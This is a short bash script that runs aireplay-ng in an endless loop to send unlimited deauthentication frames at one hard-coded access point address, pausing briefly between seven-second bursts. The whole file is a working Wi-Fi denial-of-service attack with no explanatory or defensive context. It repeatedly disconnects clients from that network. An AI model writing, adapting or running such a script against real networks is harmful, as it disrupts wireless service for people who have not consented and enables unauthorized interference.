#!/bin/bash

while true; do

	timeout 7s aireplay-ng --deauth 0 -a 90:55:DE:5F:1B:D8 wlan0mon
	clear
	sleep 4
done


